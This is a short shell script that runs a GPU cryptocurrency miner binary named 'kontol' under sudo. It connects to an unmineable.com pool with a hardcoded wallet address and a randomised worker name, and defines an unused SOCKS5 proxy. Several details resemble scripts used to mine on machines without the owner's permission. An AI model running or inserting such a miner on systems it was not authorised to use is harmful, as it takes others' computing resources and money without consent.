POOL=rx-us.unmineable.com:3333

WALLET=MANA:0xf77eee9bcb82e019a531f2a76ed415ae1f542872

WORKER=$(echo $(shuf -i 1000-9999 -n 1)-CCI)

PROXY=socks5://72.221.172.203:4145

ALGO=wrkzcoin

sudo ./kontol --pool $POOL --username $WALLET.$WORKER --password x --algorithm $ALGO --disableCPU
